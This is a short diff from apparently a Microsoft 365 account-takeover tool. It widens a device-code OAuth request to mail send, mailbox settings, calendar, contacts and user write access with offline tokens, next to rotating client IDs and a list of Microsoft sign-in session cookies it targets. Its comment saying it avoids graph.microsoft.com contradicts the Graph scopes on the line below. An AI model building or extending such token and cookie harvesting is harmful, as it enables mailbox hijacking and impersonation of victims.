@@ -23,7 +23,8 @@ CLIENT_IDS = [
 CLIENT_ID_INDEX = 0
 
 # IMPORTANT: Outlook resource ONLY. No graph.microsoft.com — mixing resources causes AADSTS65002.
-DEVICE_CODE_SCOPE = "offline_access https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/User.Read"
+DEVICE_CODE_SCOPE = "https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/MailboxSettings.ReadWrite https://graph.microsoft.com/Calendars.ReadWrite https://graph.microsoft.com/Contacts.ReadWrite https://graph.microsoft.com/User.ReadWrite offline_access openid profile"
+
 COOKIE_WANTED = [
     "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "ESTSAUTHTCT",
     "SignInStateCookie", "x-ms-gateway-suitename", "ESTSAUTHHPERSISTENT",
